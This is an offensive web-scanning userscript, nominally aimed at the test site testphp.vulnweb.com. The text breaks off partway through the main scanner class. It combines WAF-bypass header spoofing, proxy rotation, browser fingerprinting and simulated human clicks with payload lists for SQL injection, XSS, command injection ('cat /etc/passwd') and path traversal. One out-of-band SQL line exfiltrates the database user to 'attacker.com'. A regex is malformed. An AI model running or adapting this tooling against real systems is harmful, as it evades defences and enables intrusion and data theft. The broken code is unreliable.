// ==UserScript==
// @name         Enterprise Web Security Scanner - Enhanced v7.3
// @namespace    http://tampermonkey.net/
// @version      7.0
// @description  Enhanced security scanner with accurate vulnerability detection, proper verification, and realistic testing
// @author       Security Researcher
// @match        http://testphp.vulnweb.com/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_xmlhttpRequest
// @grant        GM_notification
// @grant        GM_download
// @grant        GM_setClipboard
// @grant        GM_addStyle
// @grant        GM_openInTab
// @require      https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.5/purify.min.js
// @require      https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js
// ==/UserScript==
(function() {
    'use strict';

    // ==============================
    // ANTI-DETECTION AND ANTI-THROTTLING SYSTEM
    // ==============================
    class AdvancedAntiDetectionSystem {
        constructor() {
            this.requestCount = 0;
            this.lastRequestTime = 0;
            this.blockedCount = 0;
            this.sessionFingerprint = this.generateFingerprint();
            this.browserFingerprint = this.generateBrowserFingerprint();
            this.trafficPattern = this.initializeTrafficPattern();
            this.proxyRotation = new ProxyRotationManager();
            this.lastWAFDetection = 0;
            this.wafBypassCount = 0;
        }

        generateFingerprint() {
            const components = {
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                canvasHash: this.getCanvasFingerprint(),
                webglHash: this.getWebglFingerprint(),
                audioHash: this.getAudioFingerprint(),
                fonts: this.getFontList().join(',')
            };
            return CryptoJS.SHA256(JSON.stringify(components)).toString();
        }

        generateBrowserFingerprint() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 4,
                deviceMemory: navigator.deviceMemory || 8,
                cookiesEnabled: navigator.cookieEnabled,
                webglRenderer: this.getWebglRenderer(),
                canvasFingerprint: this.getCanvasFingerprint(),
                audioFingerprint: this.getAudioFingerprint(),
                fonts: this.getFontList().join(','),
                plugins: this.getPluginList(),
                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
            };
        }

        getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.fillText('SecurityScanner', 10, 10);
            return CryptoJS.SHA256(canvas.toDataURL()).toString();
        }

        getWebglFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'no-webgl';
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) +
                           gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                }
                return 'unknown';
            } catch (e) {
                return 'error';
            }
        }

        getAudioFingerprint() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                oscillator.type = oscillator.type || 'sine';
                const gain = audioContext.createGain();
                oscillator.connect(gain);
                gain.connect(audioContext.destination);
                const sampleRate = audioContext.sampleRate || 44100;
                const channelCount = (audioContext.destination && audioContext.destination.maxChannelCount) || 2;
                oscillator.start();
                oscillator.stop(0.01);
                const fingerprint = CryptoJS.SHA256(oscillator.type + '|' + sampleRate + '|' + channelCount).toString();
                audioContext.close();
                return fingerprint;
            } catch (e) {
                return 'error';
            }
        }

        getFontList() {
            const fonts = [];
            const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia',
                              'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Arial Black', 'Helvetica'];
            const div = document.createElement('div');
            div.style.position = 'absolute';
            div.style.left = '-9999px';
            div.style.top = '-9999px';
            div.style.visibility = 'hidden';
            document.body.appendChild(div);
            const base = document.createElement('span');
            base.style.fontFamily = 'serif';
            base.textContent = 'abcdefghijklmnopqrstuvwxyz';
            div.appendChild(base);
            const baseWidth = base.offsetWidth;
            testFonts.forEach(font => {
                const span = document.createElement('span');
                span.style.fontFamily = `${font}, serif`;
                span.textContent = 'abcdefghijklmnopqrstuvwxyz';
                div.appendChild(span);
                if (span.offsetWidth !== baseWidth) {
                    fonts.push(font);
                }
            });
            document.body.removeChild(div);
            return fonts;
        }

        getPluginList() {
            return Array.from(navigator.plugins || [])
                .map(plugin => plugin.name + ':' + plugin.filename)
                .join(',');
        }

        getWebglRenderer() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'no-webgl';
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
                return 'unknown';
            } catch (e) {
                return 'error';
            }
        }

        initializeTrafficPattern() {
            return {
                requestRate: 0.8,
                burstFactor: 0.3,
                burstSize: 3,
                minDelay: 1200,
                maxDelay: 3000,
                humanLikeVariation: 0.4,
                timeOfDayPattern: this.getTimeOfDayPattern(),
                activeHours: [8, 18]
            };
        }

        getTimeOfDayPattern() {
            const hour = new Date().getHours();
            if (hour >= 8 && hour < 12) return { intensity: 1.2, burstProbability: 0.4 };
            if (hour >= 12 && hour < 14) return { intensity: 0.7, burstProbability: 0.2 };
            if (hour >= 14 && hour < 17) return { intensity: 1.1, burstProbability: 0.3 };
            if (hour >= 17 && hour < 20) return { intensity: 0.9, burstProbability: 0.25 };
            return { intensity: 0.5, burstProbability: 0.1 };
        }

        getRandomUserAgent() {
            const agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15',
                'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.168 Mobile Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1'
            ];
            return agents[Math.floor(Math.random() * agents.length)];
        }

        generateRandomIP() {
            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        }

        rotateIP() {
            const ip = this.generateRandomIP();
            return {
                'X-Forwarded-For': ip,
                'X-Real-IP': ip,
                'CF-Connecting-IP': ip,
                'X-Client-IP': ip,
                'True-Client-IP': ip,
                'X-Original-Forwarded-For': ip
            };
        }

        checkForWAF(response) {
            if (!response) return false;

            const headers = response.responseHeaders ? response.responseHeaders.toLowerCase() : '';
            const body = response.responseText ? response.responseText.toLowerCase() : '';

            // Common WAF indicators
            const wafIndicators = [
                /cloudflare/i,
                /akamai/i,
                /incapsula/i,
                /imperva/i,
                /sucuri/i,
                /barracuda/i,
                /mod_security/i,
                /webknight/i,
                /dotdefender/i,
                /fortinet/i,
                /cf-ray/i,
                /x-waf/i,
                /x-firewall/i,
                /x-secure/i
            ];

            for (const indicator of wafIndicators) {
                if (indicator.test(headers) || indicator.test(body)) {
                    this.lastWAFDetection = Date.now();
                    this.wafBypassCount++;
                    return true;
                }
            }
            return false;
        }

        shouldThrottle() {
            const now = Date.now();
            const timeDiff = now - this.lastRequestTime;

            // Basic rate limiting
            if (timeDiff < 800) {
                this.blockedCount++;
                return true;
            }

            // WAF detection throttling
            if (this.wafBypassCount > 0 && Date.now() - this.lastWAFDetection < 5000) {
                return true;
            }

            this.lastRequestTime = now;
            this.requestCount++;

            // Reset counters every minute
            if (now % 60000 < 1000) {
                this.requestCount = 0;
                this.blockedCount = 0;
            }

            return false;
        }

        getWAFBypassHeaders() {
            const headers = {};
            const techniques = [
                'X-Forwarded-Proto: https',
                'X-Forwarded-For: ' + this.generateRandomIP(),
                'CF-Connecting-IP: ' + this.generateRandomIP(),
                'X-Real-IP: ' + this.generateRandomIP(),
                'True-Client-IP: ' + this.generateRandomIP(),
                'X-Client-IP: ' + this.generateRandomIP()
            ];

            // Randomly select 1-2 techniques
            const numTechniques = Math.floor(Math.random() * 2) + 1;
            for (let i = 0; i < numTechniques; i++) {
                const technique = techniques[Math.floor(Math.random() * techniques.length)];
                const [header, value] = technique.split(': ');
                headers[header] = value;
            }

            return headers;
        }

        getDelayForRequest() {
            const pattern = this.trafficPattern;
            const baseDelay = pattern.minDelay +
                             Math.random() * (pattern.maxDelay - pattern.minDelay);
            const humanVariation = baseDelay * pattern.humanLikeVariation * (Math.random() * 2 - 1);
            const timeOfDayFactor = pattern.timeOfDayPattern.intensity;

            return Math.max(800, baseDelay + humanVariation) * timeOfDayFactor;
        }

        simulateHumanBehavior() {
            // This is now more subtle and realistic
            const randomMove = () => {
                if (Math.random() > 0.7) {
                    const x = Math.random() * window.innerWidth * 0.8;
                    const y = Math.random() * window.innerHeight * 0.8;
                    try {
                        const event = new MouseEvent('mousemove', {
                            view: window,
                            bubbles: true,
                            cancelable: true,
                            clientX: x,
                            clientY: y
                        });
                        document.elementFromPoint(x, y)?.dispatchEvent(event);
                    } catch (e) {
                        // Ignore
                    }
                }
            };

            const randomScroll = () => {
                if (Math.random() > 0.8) {
                    const scrollAmount = (Math.random() * 100 - 50);
                    window.scrollBy(0, scrollAmount);
                }
            };

            const simulateReadingTime = () => {
                if (Math.random() > 0.95) {
                    const readingTime = Math.random() * 2000 + 1000;
                    setTimeout(() => {
                        const elements = document.querySelectorAll('a, button, input[type="submit"]');
                        if (elements.length > 0) {
                            const element = elements[Math.floor(Math.random() * elements.length)];
                            element.click();
                        }
                    }, readingTime);
                }
            };

            setInterval(randomMove, 1500 + Math.random() * 3000);
            setInterval(randomScroll, 2500 + Math.random() * 4000);
            setInterval(simulateReadingTime, 10000 + Math.random() * 15000);
        }
    }

    // ==============================
    // PROXY ROTATION MANAGER
    // ==============================
    class ProxyRotationManager {
        constructor() {
            this.proxyList = [];
            this.currentProxyIndex = 0;
            this.proxyUsage = new Map();
            this.loadProxyList();
        }

        loadProxyList() {
            // In a real implementation, this would load from a secure source
            // For now, we'll use a smaller, more realistic list
            this.proxyList = [
                { url: 'http://proxy1.example.com:8080', type: 'premium', successRate: 0.95 },
                { url: 'http://proxy2.example.com:8080', type: 'premium', successRate: 0.92 },
                { url: 'http://proxy3.example.com:8080', type: 'premium', successRate: 0.97 }
            ];

            // Initialize usage tracking
            this.proxyList.forEach(proxy => {
                this.proxyUsage.set(proxy.url, {
                    requests: 0,
                    successes: 0,
                    lastUsed: 0,
                    blocked: false
                });
            });
        }

        getProxy() {
            const now = Date.now();
            const usableProxies = this.proxyList
                .filter(proxy => {
                    const usage = this.proxyUsage.get(proxy.url);
                    return !usage.blocked && (now - usage.lastUsed > 5000);
                })
                .sort((a, b) => {
                    const usageA = this.proxyUsage.get(a.url);
                    const usageB = this.proxyUsage.get(b.url);
                    return (b.successRate - a.successRate) ||
                           (usageA.lastUsed - usageB.lastUsed);
                });

            if (usableProxies.length === 0) {
                return null;
            }

            const proxy = usableProxies[0];
            const usage = this.proxyUsage.get(proxy.url);
            usage.requests++;
            usage.lastUsed = now;
            this.currentProxyIndex = this.proxyList.findIndex(p => p.url === proxy.url);
            return proxy;
        }

        reportSuccess(proxyUrl) {
            const usage = this.proxyUsage.get(proxyUrl);
            if (usage) {
                usage.successes++;
                const successRate = usage.successes / usage.requests;
                const proxy = this.proxyList.find(p => p.url === proxyUrl);
                if (proxy) {
                    proxy.successRate = successRate;
                }
            }
        }

        reportFailure(proxyUrl) {
            const usage = this.proxyUsage.get(proxyUrl);
            if (usage) {
                usage.blocked = true;
                usage.lastUsed = Date.now() + 30000; // Block for 30 seconds
            }
        }
    }

    // ==============================
    // VULNERABILITY DATABASE
    // ==============================
    class VulnerabilityDatabase {
        constructor() {
            this.vulnPatterns = {
                sql: {
                    errorBased: [
                        /SQL syntax.*MySQL/i,
                        /Warning.*mysql_.*$/i,
                        /MySQLSyntaxErrorException/i,
                        /valid MySQL result/i,
                        /You have an error in your SQL syntax/i,
                        /near ".*": syntax error/i,
                        /sqlite3.OperationalError:/i,
                        /Microsoft OLE DB Provider for ODBC Drivers/i,
                        /Unclosed quotation mark/i,
                        /unterminated quoted string/i,
                        /ORA-\d+/i,
                        /Oracle error/i,
                        /PostgreSQL.*ERROR/i,
                        /PSQLException/i,
                        /SQLSTATE\[\d+\]/i,
                        /Division by zero/i,
                        /Incorrect syntax near/i
                    ],
                    blind: [
                        /1=1|2=2|true/i,
                        /sleep.*\(.*\)/i,
                        /waitfor.*delay/i,
                        /benchmark.*\(.*\)/i,
                        /pg_sleep.*\(.*\)/i
                    ]
                },
                xss: {
                    reflection: [
                        /<script|javascript:|on\w+\s*=|\<svg|<\/script>/i,
                        /alert\(|confirm\(|prompt\(|document\.cookie/i
                    ],
                    dom: [
                        /document\.|window\.|location\.|eval\(|setTimeout\(|setInterval\(/i
                    ]
                },
                command: {
                    patterns: [
                        /Command failed/i,
                        /sh: /i,
                        //bin/sh/i,
                        /is not recognized as an internal or external command/i,
                        /command not found/i,
                        /error in command/i
                    ]
                },
                pathTraversal: {
                    patterns: [
                        /root:x:/,
                        /etc\/passwd/,
                        /\[SYSTEM\]/i,
                        /Directory listing denied/i,
                        /No such file/i
                    ]
                }
            };

            this.vulnerabilityTypes = {
                'SQL Injection': {
                    testTypes: ['error', 'boolean', 'time', 'out-of-band'],
                    confidenceThreshold: 0.7,
                    severity: 'HIGH'
                },
                'Cross-Site Scripting': {
                    testTypes: ['reflected', 'dom'],
                    confidenceThreshold: 0.7,
                    severity: 'MEDIUM'
                },
                'Command Injection': {
                    testTypes: ['command', 'os'],
                    confidenceThreshold: 0.6,
                    severity: 'HIGH'
                },
                'Path Traversal': {
                    testTypes: ['file-read'],
                    confidenceThreshold: 0.6,
                    severity: 'MEDIUM'
                }
            };

            this.payloads = this.generateAllPayloads();
        }

        generateAllPayloads() {
            return {
                sql: {
                    errorBased: [
                        "'",
                        "''",
                        "' OR '1'='1",
                        "' UNION SELECT 1,2,3--",
                        "' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT USER())))--"
                    ],
                    booleanBased: [
                        "' AND 1=1--",
                        "' AND 1=2--",
                        "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--"
                    ],
                    timeBased: [
                        "' OR SLEEP(5)--",
                        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                        "'%20WAITFOR%20DELAY%20'0:0:5'--"
                    ],
                    outOfBand: [
                        "' AND LOAD_FILE(CONCAT('\\\\',@@hostname,'.attacker.com',CHAR(92),'a'))--",
                        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER())))--"
                    ]
                },
                xss: [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "'><script>alert(1)</script>",
                    "<a href=\"javascript:alert('XSS')\">click</a>",
                    "javascript:alert('XSS')"
                ],
                command: [
                    "; ls -la",
                    "| cat /etc/passwd",
                    "&& whoami",
                    "| netstat -an",
                    "; cat /etc/passwd"
                ],
                pathTraversal: [
                    "../../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
                ]
            };
        }

        getVulnerabilityConfidence(vulnType, score) {
            if (score >= 0.8) return 'HIGH';
            if (score >= 0.6) return 'MEDIUM';
            return 'LOW';
        }

        getVerificationStages(vulnType) {
            const stages = {
                'SQL Injection': [
                    { stage: 1, name: 'Error pattern detection', required: true },
                    { stage: 2, name: 'Boolean verification', required: true },
                    { stage: 3, name: 'Time-based confirmation', required: false },
                    { stage: 4, name: 'Out-of-band verification', required: false }
                ],
                'Cross-Site Scripting': [
                    { stage: 1, name: 'Payload reflection', required: true },
                    { stage: 2, name: 'DOM mutation tracking', required: true },
                    { stage: 3, name: 'Context analysis', required: true }
                ],
                'Command Injection': [
                    { stage: 1, name: 'Command execution pattern', required: true },
                    { stage: 2, name: 'OS detection verification', required: true }
                ],
                'Path Traversal': [
                    { stage: 1, name: 'File content detection', required: true },
                    { stage: 2, name: 'Sensitivity analysis', required: true }
                ]
            };
            return stages[vulnType] || [
                { stage: 1, name: 'Initial detection', required: true }
            ];
        }

        analyzeResponseForVulnerabilities(response, url) {
            const results = [];

            // SQL Injection detection
            if (this.detectSQLInjection(response)) {
                results.push({
                    type: 'SQL Injection',
                    confidence: 0.6,
                    evidence: 'SQL error patterns detected in response'
                });
            }

            // XSS detection
            if (this.detectXSS(response)) {
                results.push({
                    type: 'Cross-Site Scripting',
                    confidence: 0.6,
                    evidence: 'XSS payload reflected in response'
                });
            }

            // Command Injection detection
            if (this.detectCommandInjection(response)) {
                results.push({
                    type: 'Command Injection',
                    confidence: 0.6,
                    evidence: 'Command execution patterns detected'
                });
            }

            // Path Traversal detection
            if (this.detectPathTraversal(response)) {
                results.push({
                    type: 'Path Traversal',
                    confidence: 0.6,
                    evidence: 'Sensitive file content detected'
                });
            }

            return results;
        }

        detectSQLInjection(response) {
            if (!response || !response.responseText) return false;
            const content = response.responseText.toLowerCase();
            return this.vulnPatterns.sql.errorBased.some(pattern => pattern.test(content));
        }

        detectXSS(response) {
            if (!response || !response.responseText) return false;
            const content = response.responseText;
            return this.vulnPatterns.xss.reflection.some(pattern => pattern.test(content));
        }

        detectCommandInjection(response) {
            if (!response || !response.responseText) return false;
            const content = response.responseText.toLowerCase();
            return this.vulnPatterns.command.patterns.some(pattern => pattern.test(content));
        }

        detectPathTraversal(response) {
            if (!response || !response.responseText) return false;
            const content = response.responseText.toLowerCase();
            return this.vulnPatterns.pathTraversal.patterns.some(pattern => pattern.test(content));
        }

        getVerificationConfidence(vulnType, verificationResults) {
            let confidence = 0.5; // Base confidence

            // Add confidence based on verification results
            verificationResults.forEach(result => {
                if (result.verified) {
                    confidence += 0.2;
                }
            });

            // Cap at 0.95
            return Math.min(0.95, confidence);
        }
    }

    // ==============================
    // CRAWLER
    // ==============================
    class AdvancedCrawler {
        constructor(scanner) {
            this.scanner = scanner;
            this.visitedUrls = new Set();
            this.discoveredEndpoints = new Set();
            this.crawlQueue = [];
            this.dynamicContentDetected = false;
            this.ajaxEndpoints = new Set();
            this.crawlState = {
                pagesScanned: 0,
                maxPages: 75,
                depthLimit: 3,
                currentDepth: 0,
                timeBudget: 1800000, // 30 minutes
                startTime: Date.now()
            };
            this.frameworkDetector = new FrameworkDetector();
        }

        async automatedDeepCrawl(startUrl) {
            if (this.crawlerActive) {
                this.scanner.addDiscovery('⚠️  Crawl already in progress');
                return;
            }

            this.crawlerActive = true;
            this.crawlState.startTime = Date.now();
            this.scanner.updateStatus('🔍  AUTOMATED DEEP CRAWL STARTED', 'scanning');

            this.crawlQueue.push({ url: startUrl, depth: 0, priority: 1 });

            while (this.crawlQueue.length > 0 &&
                   this.scanner.state.isScanning &&
                   this.crawlState.pagesScanned < this.crawlState.maxPages &&
                   (Date.now() - this.crawlState.startTime) < this.crawlState.timeBudget) {

                const { url, depth, priority } = this.crawlQueue.shift();

                if (this.shouldSkipUrl(url) || depth > this.crawlState.depthLimit) {
                    continue;
                }

                await this.safeCrawlPage(url, depth);
                await this.scanner.delay(this.scanner.antiDetect.getDelayForRequest());

                // Update crawl state
                this.crawlState.pagesScanned++;
                this.crawlState.currentDepth = depth;

                // Check if we've reached the maximum number of pages
                if (this.visitedUrls.size >= this.crawlState.maxPages) {
                    this.scanner.addDiscovery(`⚠️  Reached maximum page limit (${this.crawlState.maxPages})`);
                    break;
                }
            }

            this.crawlerActive = false;
            this.scanner.updateStatus('✅  AUTOMATED CRAWL COMPLETED', 'ready');
        }

        async safeCrawlPage(url, depth) {
            try {
                if (this.visitedUrls.has(url)) return;
                this.visitedUrls.add(url);
                this.scanner.addDiscovery(`🔍  Crawling: ${url} (depth: ${depth})`);

                const response = await this.scanner.makeRequest(url);
                if (!response) return;

                this.scanner.state.scanStats.pagesScanned++;
                this.scanner.state.scanStats.totalBytes += response.responseText?.length || 0;

                // Detect framework
                this.frameworkDetector.analyzeResponse(response, url);

                // Analyze and extract content
                await this.analyzeAndExtract(response.responseText, url, depth);

                // Check for dynamic content
                if (this.detectDynamicContent(response.responseText)) {
                    this.dynamicContentDetected = true;
                }
            } catch (error) {
                this.scanner.addDiscovery(`⚠️  Crawl error: ${url} - ${error.message}`);
            }
        }

        async analyzeAndExtract(content, url, depth) {
            try {
                const parser = new DOMParser();
                const doc = parser.parseFromString(content, 'text/html');

                this.extractAndQueueLinks(doc, url, depth);
                this.extractForms(doc, url);
                this.extractResources(doc, url);
                this.extractAPIs(doc, url);
                this.extractComments(content, url);
                this.extractFrameworkSpecificContent(doc, url);
            } catch (error) {
                // Continue crawling
            }
        }

        detectDynamicContent(content) {
            return content.includes('DOMContentLoaded') ||
                   content.includes('React') ||
                   content.includes('Vue') ||
                   content.includes('Angular') ||
                   content.includes('jQuery');
        }

        extractAndQueueLinks(doc, baseUrl, depth) {
            const links = doc.querySelectorAll('a[href], link[href], area[href]');
            const priorityLinks = [];

            links.forEach(link => {
                try {
                    const href = link.getAttribute('href');
                    if (!href || href.startsWith('javascript:') || href.startsWith('mailto:')) return;

                    let priority = 1.0;

                    // Determine link priority
                    if (href.includes('admin') || href.includes('dashboard') || href.includes('settings')) {
                        priority = 1.5;
                    } else if (href.includes('login') || href.includes('register') || href.includes('profile')) {
                        priority = 1.2;
                    } else if (href.includes('search') || href.includes('api') || href.includes('v1')) {
                        priority = 1.3;
                    }

                    const absoluteUrl = new URL(href, baseUrl).href;
                    if (this.scanner.isSameDomain(absoluteUrl) && !this.visitedUrls.has(absoluteUrl)) {
                        priorityLinks.push({ url: absoluteUrl, depth: depth + 1, priority });
                    }
                } catch (error) {
                    // Skip invalid URLs
                }
            });

            // Sort by priority before adding to queue
            priorityLinks.sort((a, b) => b.priority - a.priority);
            priorityLinks.forEach(link => this.crawlQueue.push(link));
        }

        extractForms(doc, url) {
            const forms = doc.querySelectorAll('form');
            forms.forEach(form => {
                try {
                    const formData = this.scanner.analyzeForm(form, url);
                    this.scanner.state.formsFound.push(formData);
                    this.scanner.addDiscovery(`📝  Form detected: ${formData.action} (${formData.method})`);
                } catch (error) {
                    // Skip form extraction errors
                }
            });
        }

        extractAPIs(doc, url) {
            const scripts = doc.querySelectorAll('script');
            scripts.forEach(script => {
                const content = script.textContent || script.innerHTML;
                this.extractAJAXCalls(content, url);
                this.extractAPIEndpoints(content, url);
            });
        }

        extractAJAXCalls(content, url) {
            const patterns = [
                /fetch\(['"]([^'"]+)['"]/g,
                /\.ajax\([^)]*url:\s*['"]([^'"]+)['"]/g,
                /\.get\(['"]([^'"]+)['"]/g,
                /\.post\(['"]([^'"]+)['"]/g,
                /axios\.(get|post|put|delete)\(['"]([^'"]+)['"]/g,
                /XMLHttpRequest[^]*?open\([^)]*?['"]([^'"]+)['"]/g
            ];

            patterns.forEach(pattern => {
                let match;
                while ((match = pattern.exec(content)) !== null) {
                    const endpoint = match[1] || match[2];
                    if (endpoint && !endpoint.startsWith('javascript:')) {
                        try {
                            const absoluteUrl = new URL(endpoint, url).href;
                            if (this.scanner.isSameDomain(absoluteUrl)) {
                                this.ajaxEndpoints.add(absoluteUrl);
                                this.scanner.addDiscovery(`🔧  AJAX Endpoint: ${absoluteUrl}`);
                            }
                        } catch (error) {
                            // Skip invalid URLs
                        }
                    }
                }
            });
        }

        extractAPIEndpoints(content, url) {
            // Extract REST API endpoints from JavaScript code
            const apiPatterns = [
                /\/api\/[a-z0-9_-]+/gi,
                /\/v[0-9]+\/[a-z0-9_-]+/gi,
                /\/rest\/[a-z0-9_-]+/gi
            ];

            apiPatterns.forEach(pattern => {
                let match;
                while ((match = pattern.exec(content)) !== null) {
                    try {
                        const apiEndpoint = new URL(match[0], url).href;
                        if (this.scanner.isSameDomain(apiEndpoint)) {
                            this.ajaxEndpoints.add(apiEndpoint);
                            this.scanner.addDiscovery(`🔧  API Endpoint: ${apiEndpoint}`);
                        }
                    } catch (e) {
                        // Invalid URL
                    }
                }
            });
        }

        extractComments(content, url) {
            const commentPattern = /<!--([\s\S]*?)-->|\/\*([\s\S]*?)\*\//g;
            let match;
            const sensitivePatterns = [
                /password.*=.*['"][^'"]*['"]/i,
                /api[_-]?key.*=.*['"][^'"]*['"]/i,
                /secret.*=.*['"][^'"]*['"]/i,
                /token.*=.*['"][^'"]*['"]/i,
                /database.*=.*['"][^'"]*['"]/i,
                /credentials.*=.*['"][^'"]*['"]/i,
                /hash.*=.*['"][^'"]*['"]/i,
                /salt.*=.*['"][^'"]*['"]/i
            ];

            while ((match = commentPattern.exec(content)) !== null) {
                const comment = match[1] || match[2];
                sensitivePatterns.forEach(pattern => {
                    if (pattern.test(comment)) {
                        this.scanner.addDiscovery(`💬  Sensitive comment found at: ${url}`);
                    }
                });
            }
        }

        extractResources(doc, url) {
            const resources = doc.querySelectorAll('script[src], img[src], link[href]');
            resources.forEach(resource => {
                const src = resource.getAttribute('src') || resource.getAttribute('href');
                if (src && this.scanner.isSameDomain(src)) {
                    this.scanner.addDiscovery(`📁  Resource: ${src}`);
                }
            });
        }

        extractFrameworkSpecificContent(doc, url) {
            // Detect React/Vue/Angular specific content
            const reactPatterns = ['data-react', 'react-root', 'react-app'];
            const vuePatterns = ['data-vue', 'vue-app', 'v-'];
            const angularPatterns = ['ng-', 'data-ng-', 'x-ng-'];

            const detectFramework = (patterns, frameworkName) => {
                patterns.forEach(pattern => {
                    if (doc.querySelector(`[${pattern}]`)) {
                        this.scanner.addDiscovery(`⚛️  ${frameworkName} detected at: ${url}`);
                    }
                });
            };

            detectFramework(reactPatterns, 'React');
            detectFramework(vuePatterns, 'Vue.js');
            detectFramework(angularPatterns, 'Angular');
        }

        shouldSkipUrl(url) {
            const skipPatterns = [
                /logout/i,
                /signout/i,
                /exit/i,
                /close/i,
                /\.pdf$/i,
                /\.docx?$/i,
                /\.xlsx?$/i,
                /\.zip$/i,
                /\.rar$/i,
                /\.tar$/i,
                /\.gz$/i,
                /\.mp4$/i,
                /\.avi$/i,
                /\.mov$/i,
                /\.jpg$/i,
                /\.jpeg$/i,
                /\.png$/i,
                /\.gif$/i,
                /\.svg$/i,
                /\.css$/i,
                /\.js$/i,
                /\.woff$/i,
                /\.ttf$/i
            ];

            return skipPatterns.some(pattern => pattern.test(url));
        }
    }

    // ==============================
    // FRAMEWORK DETECTOR
    // ==============================
    class FrameworkDetector {
        constructor() {
            this.frameworks = {
                'React': {
                    patterns: [/data-react/i, /react-root/i, /react-app/i],
                    confidence: 0
                },
                'Vue.js': {
                    patterns: [/data-vue/i, /vue-app/i, /v-\w+/i],
                    confidence: 0
                },
                'Angular': {
                    patterns: [/ng-app/i, /data-ng/i, /x-ng/i],
                    confidence: 0
                },
                'jQuery': {
                    patterns: [/\$\.ajax/i, /\$\.get/i, /\$\.post/i],
                    confidence: 0
                },
                'Bootstrap': {
                    patterns: [/bootstrap/i, /data-toggle/i, /data-target/i],
                    confidence: 0
                },
                'WordPress': {
                    patterns: [/wp-content/i, /wp-includes/i, /wp-admin/i],
                    confidence: 0
                },
                'Laravel': {
                    patterns: [/laravel/i, /csrf-token/i],
                    confidence: 0
                }
            };
        }

        analyzeResponse(response, url) {
            const content = response.responseText || '';
            const headers = response.responseHeaders || '';

            Object.keys(this.frameworks).forEach(framework => {
                const frameworkData = this.frameworks[framework];
                let confidence = 0;

                // Check content patterns
                frameworkData.patterns.forEach(pattern => {
                    if (pattern.test(content)) {
                        confidence += 0.3;
                    }
                });

                // Check headers
                if (framework === 'WordPress' && headers.includes('wp-')) {
                    confidence += 0.2;
                }

                // Update framework confidence
                frameworkData.confidence = Math.min(1, confidence);
            });
        }

        getDetectedFrameworks() {
            return Object.keys(this.frameworks)
                .filter(framework => this.frameworks[framework].confidence > 0.2)
                .map(framework => ({
                    name: framework,
                    confidence: this.frameworks[framework].confidence
                }));
        }
    }

    // ==============================
    // MAIN SCANNER CLASS
    // ==============================
    class EnterpriseWebSecurityScanner {
        constructor() {
            this.state = {
                isScanning: false,
                vulnerabilities: [],
                scanStats: {
                    pagesScanned: 0,
                    vulnerabilitiesFound: 0,
                    totalBytes: 0,
                    startTime: null,
                    endTime: null
                },
